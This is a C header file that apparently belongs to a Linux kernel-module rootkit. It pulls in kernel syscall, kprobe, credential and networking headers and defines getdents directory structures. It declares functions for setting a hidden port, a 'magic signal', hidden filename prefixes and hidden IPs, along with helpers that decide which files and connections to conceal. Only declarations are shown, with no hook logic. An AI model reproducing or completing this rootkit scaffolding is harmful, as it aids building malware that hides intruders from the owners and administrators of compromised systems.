#ifndef HEADERS_H
#define HEADERS_H

// System includes
#include <linux/syscalls.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/sched/signal.h>
#include <linux/string.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/rcupdate.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/utsname.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/net.h>
#include <linux/socket.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <net/sock.h>
#include <net/tcp.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/capability.h>
#include <linux/ptrace.h>

// Constants
#define BUFFER_SIZE 4096
#define MAX_PATH_LEN 256
#define MAX_PREFIX_LEN 32

// Signal definitions for older kernels
#ifndef SIGKILL
#define SIGKILL 9
#endif
#ifndef SIGTERM  
#define SIGTERM 15
#endif
#ifndef SIGSTOP
#define SIGSTOP 19
#endif

// PTRACE definitions
#ifndef PTRACE_TRACEME
#define PTRACE_TRACEME 0
#endif
#ifndef PTRACE_ATTACH
#define PTRACE_ATTACH 16
#endif
#ifndef PTRACE_DETACH
#define PTRACE_DETACH 17
#endif
#ifndef PTRACE_PEEKTEXT
#define PTRACE_PEEKTEXT 1
#endif

// Directory structures for compatibility
struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[1];
};

struct linux_dirent64 {
    u64 d_ino;
    s64 d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[0];
};

// Global configuration functions (implemented by main.c)
extern void set_hidden_port(int port);
extern void set_magic_signal(int signal);
extern void set_hidden_prefixes(char **prefixes);
extern void set_hidden_ips(char **ips);

// Utility functions (can be implemented in any hook file)
static inline int should_hide_file(const char *name);
static inline int should_hide_connection(int port, const char *ip);

#endif // HEADERS_H
